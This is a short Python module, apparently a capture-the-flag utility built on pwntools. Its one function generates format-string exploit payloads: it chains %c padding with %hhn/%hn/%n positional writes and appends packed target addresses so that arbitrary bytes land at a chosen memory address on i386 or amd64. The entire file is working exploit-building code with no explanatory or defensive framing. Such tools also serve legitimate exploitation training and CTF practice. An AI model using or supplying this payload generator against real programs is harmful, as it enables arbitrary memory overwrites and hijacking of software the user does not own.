from pwn import u32, p32, p64


def gen_fmt_write2target_payload(msg: bytes, target_addr: int, fmt_buf_idx: int, arch: str, step: int=1):
    """
    - input : `msg (bytes)`, `target_addr (int)`, `arch (str)`, `step (int, default 1)`
    - output : `payload (bytes)`
    """

    assert (step in (1, 2, 4)) and (arch in ('i386', 'amd64')) and (len(msg) % step) == 0

    length, mask = len(msg), int('ff' * step, 16)
    addr_length = 8 if (arch == 'amd64') else 4

    prenum, payload = 0, ''
    for i in range(0, length, step):
        num = u32(msg[i: i + step].ljust(4, b'\0'))

        if num != prenum:
            payload += f'%{(num - prenum) & mask}c'
            prenum = num

        if step == 1:
            payload += '%{}$hhn'
        elif step == 2:
            payload += '%{}$hn'
        else:
            payload += '%{}$n'

    predict_length = len(payload)
    predict_start_idx = fmt_buf_idx + (predict_length - (predict_length % addr_length) + addr_length) // addr_length
    while True:
        new_payload = payload.format(*[predict_start_idx + i for i in range(length // step)])
        if len(new_payload) <= (predict_start_idx - fmt_buf_idx) * addr_length:
            payload = new_payload.ljust((predict_start_idx - fmt_buf_idx) * addr_length, '.')
            break
        predict_start_idx += 1

    payload = payload.encode()
    for i in range(0, length, step):
        payload += p64(target_addr + i) if arch == 'amd64' else p32(target_addr + i)
    return payload